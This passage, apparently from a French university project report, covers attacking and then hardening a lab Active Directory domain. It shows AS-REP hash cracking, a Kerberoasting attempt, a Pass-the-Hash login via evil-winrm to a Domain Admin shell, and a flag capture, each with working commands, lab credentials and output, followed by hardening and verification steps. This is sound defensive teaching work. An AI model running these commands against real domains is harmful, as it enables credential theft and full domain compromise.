Progress.........: 33792/14344385 (0.24%)
```

** Hash cracké en 1 seconde !**

```
john.doe : Password123
```

> **Pourquoi c'est dangereux :** Hashcat a essayé des millions de mots de passe localement — le DC n'a jamais vu une seule tentative d'authentification. Aucun log de sécurité, aucune alerte. L'attaque est totalement invisible.

<img width="1086" height="548" alt="image" src="https://github.com/user-attachments/assets/97a1f187-d6c0-4132-a592-46ff82240de5" />


---

### 4.2 Kerberoasting (Step 3.2)

**Théorie :**
Le Kerberoasting consiste à demander un ticket TGS pour un compte ayant un SPN configuré. Ce ticket est chiffré avec le hash du mot de passe du compte de service. Avec `john.doe` authentifié, on cible `svc.backup` qui possède `MSSQLSvc/dc01.ENSA.local:1433`.

**Commande (pour référence) :**

```bash
/root/bhenv/bin/python3 /root/bhenv/bin/GetUserSPNs.py ENSA.local/john.doe:Password123 -dc-ip 192.168.56.10 -request
```

**Output :**

```
ServicePrincipalName           Name        MemberOf  PasswordLastSet
-----------------------------  ----------  --------  --------------------------
MSSQLSvc/dc01.ENSA.local:1433  svc.backup            2026-04-06 17:02:22.028809

[-] SessionKeyDecryptionError: failed to decrypt session key: ciphertext integrity failure
```

**Limitation rencontrée :** Windows Server 2025 impose **AES uniquement** pour Kerberos par défaut, empêchant le Kerberoasting RC4 standard. Malgré l'activation de RC4 via GPO, le problème persiste.

> **Note importante pour le rapport :** Le SPN sur `svc.backup` a été confirmé via l'énumération le vecteur d'attaque existe bel et bien. Sur un DC plus ancien (Windows Server 2016/2019), cette attaque réussirait identiquement à l'AS-REP Roasting. L'AES-only est une amélioration de sécurité significative de Windows Server 2025.

---

### 4.3 Pass-the-Hash (Step 3.3)

**Théorie :**
Le Pass-the-Hash (PtH) exploite le fait que Windows utilise le **hash NTLM** du mot de passe pour l'authentification réseau, pas le mot de passe en clair. Si un attaquant possède le hash, il peut s'authentifier sans jamais connaître le mot de passe.

Le hash NTLM est calculé ainsi : `MD4(mot_de_passe_en_UTF-16-LE)`

**Calcul du hash NTLM de jane.admin :**

```bash
python3 -c "import hashlib; print(hashlib.new('md4', 'Pdcemulator123!'.encode('utf-16le')).hexdigest())"
```

**Output :**

```
02e76cbda1853d84bc588db37f6f24ee
```

**Exploitation via evil-winrm (WinRM port 5985 découvert lors du scan nmap) :**

```bash
evil-winrm -i 192.168.56.10 -u jane.admin -H 02e76cbda1853d84bc588db37f6f24ee
```

**Output :**

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jane.admin\Documents>
```

** Shell PowerShell distant sur DC01 en tant que Domain Admin !**

<img width="1085" height="294" alt="image" src="https://github.com/user-attachments/assets/fe1c58cd-3b98-47e8-af45-8a07dd7da99f" />


---

### 4.4 Capture du flag final (Step 3.4)

**Dans le shell evil-winrm :**

```powershell
type "C:\Users\Administrateur\Desktop\flag.txt.txt"
```

**Output :**

```
FLAG{da_owned_abog}
```

** Domaine compromis : FLAG{da_owned_abog} capturé !**

<img width="1071" height="435" alt="image" src="https://github.com/user-attachments/assets/7fd1f9f0-af46-445c-b37c-aa5f2cbcb1de" />


---

### 4.5 Récapitulatif de la chaîne d'attaque

```
[Étape 1] AS-REP Roast john.doe
          └── Aucun credential requis au départ
          └── Hash AS-REP capturé et cracké → Password123

[Étape 2] Authentification comme john.doe
          └── Énumération complète du domaine via enum4linux-ng
          └── BloodHound → chemin vers DA identifié

[Étape 3] Pass-the-Hash avec jane.admin
          └── Hash NTLM calculé depuis le mot de passe
          └── evil-winrm → Shell DA sur DC01 via WinRM (port 5985)

[Résultat] FLAG{da_owned_abog} — Domaine entièrement compromis
           Temps total: < 30 minutes depuis un accès réseau interne basique
```

**Pourquoi c'est réaliste :**
Un employé malveillant ou un attaquant ayant compromis n'importe quel poste de travail sur le réseau peut reproduire cette chaîne. Aucune des étapes ne requiert de privilèges élevés au départ — juste un accès réseau interne.

---

## 5. Phase 5 — Durcissement (Person 2)

>  Cette phase est à réaliser par **Person 2** à partir des résultats de la Phase 3.

### Objectif

Corriger chaque misconfiguration exploitée et vérifier que les attaques ne fonctionnent plus.

### 5.1 Corrections à appliquer

| Attaque réussie | Correction à appliquer |
|---|---|
| AS-REP Roasting `john.doe` | Réactiver la pré-authentification Kerberos |
| Pass-the-Hash `jane.admin` | Retirer `jane.admin` des Admins du domaine |
| Accès WinRM non restreint | Désactiver WinRM ou le restreindre aux Tier 0 |
| Aucun lockout de compte | Configurer une politique de verrouillage |
| Énumération LDAP complète | Restreindre les requêtes LDAP |
| RC4 activé | Imposer AES uniquement pour Kerberos |
| LDAP signing désactivé | Réactiver le LDAP signing |

### 5.2 Étapes de durcissement recommandées

#### Réactiver la pré-authentification sur john.doe

```
ADUC → Users → john.doe → Propriétés → Onglet Compte
→ Décocher "Ne pas exiger la pré-authentification Kerberos"
→ Appliquer → OK
```
<img width="523" height="547" alt="image" src="https://github.com/user-attachments/assets/f1056d54-7361-4cd7-95ff-144d55d3954a" />


#### Retirer jane.admin des Admins du domaine

```
ADUC → Users → Admins du domaine → Propriétés → Membres
→ Sélectionner jane.admin → Supprimer
→ Appliquer → OK
```
<img width="1378" height="31" alt="image" src="https://github.com/user-attachments/assets/72f1cc34-75c1-4744-9ea6-6a33c38e1119" />

#### Implémenter LAPS (Local Administrator Password Solution)

LAPS génère automatiquement des mots de passe uniques et aléatoires pour les comptes administrateurs locaux de chaque machine, empêchant le Pass-the-Hash latéral.

#### Configurer la politique de verrouillage

```
Group Policy Management → Default Domain Policy → Edit
→ Computer Configuration → Windows Settings → Security Settings
→ Account Policies → Account Lockout Policy
→ Lockout threshold: 5 tentatives
→ Lockout duration: 30 minutes
```
<img width="379" height="304" alt="image" src="https://github.com/user-attachments/assets/e5a139c2-b16e-4877-9b12-37574ff06ea5" />
<img width="1600" height="65" alt="image" src="https://github.com/user-attachments/assets/6d734f63-7370-434e-8be8-e87035c5a9d4" />



#### Imposer AES uniquement pour Kerberos

```
gpedit.msc → Computer Configuration → Windows Settings
→ Security Settings → Local Policies → Security Options
→ "Network security: Configure encryption types allowed for Kerberos"
→ Décocher RC4_HMAC_MD5, garder seulement AES128 et AES256
```
<img width="523" height="625" alt="image" src="https://github.com/user-attachments/assets/37b8bf98-101f-4e6a-98bb-64673b98b13e" />


#### Réactiver le LDAP signing

```
gpedit.msc → Computer Configuration → Windows Settings
→ Security Settings → Local Policies → Security Options
→ "Domain controller: LDAP server signing requirements"
→ Mettre à: Require signing
```
<img width="1053" height="154" alt="image" src="https://github.com/user-attachments/assets/4877c4b4-ce5c-4944-9030-e7d1a32556a6" />


---

## 6. Phase 6 — Vérification

>  À réaliser conjointement après la Phase 5.

### Objectif

Relancer chaque attaque de la Phase 3 et confirmer qu'elles échouent.

### Tableau de vérification

| Attaque | Commande de vérification | Résultat attendu post-durcissement |
|---|---|---|
| AS-REP Roasting | `GetNPUsers.py ENSA.local/john.doe -no-pass -dc-ip 192.168.56.10` | `[-] User john.doe doesn't have UF_DONT_REQUIRE_PREAUTH` |
| Pass-the-Hash WinRM | `evil-winrm -i 192.168.56.10 -u jane.admin -H 02e76cbda1853d84bc588db37f6f24ee` | `Error: An error of type WinRM::WinRMAuthorizationError` |
| Lecture du flag | `type C:\Users\Administrateur\Desktop\flag.txt.txt` | Accès refusé |
| Énumération LDAP | `enum4linux-ng -A -u john.doe -p Password123 192.168.56.10` | Informations limitées / accès refusé |


---

## 7. Références

| Outil | Source |
|---|---|
| Impacket (GetNPUsers, GetUserSPNs) | https://github.com/fortra/impacket |
| BloodHound / bloodhound-python | https://github.com/dirkjanm/BloodHound.py |
| evil-winrm | https://github.com/Hackplayers/evil-winrm |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Hashcat | https://hashcat.net/hashcat/ |
| Nmap | https://nmap.org |

---

## Annexe — Commandes de démarrage rapide

À chaque session de travail, exécuter ces commandes sur Kali avant de commencer :

```bash
# 1. Passer en root
su

# 2. Corriger la route par défaut pour avoir internet ET accès au lab
ip route del default via 192.168.56.1 dev eth0

# 3. Activer l'environnement virtuel Python (pour bloodhound-python et impacket)
source ~/bhenv/bin/activate

# 4. Vérifier la connectivité vers DC01
ping 192.168.56.10

# 5. Vérifier la résolution DNS
nslookup ENSA.local 192.168.56.10
```

>  **Ordre de démarrage des VMs :** Toujours démarrer **DC01 en premier**, attendre qu'il soit complètement démarré, puis démarrer Kali (et WS01 si nécessaire).

---

*Documentation rédigée dans le cadre du projet universitaire  Analyse et durcissement de la sécurité d'un environnement Active Directory face aux attaques internes.*
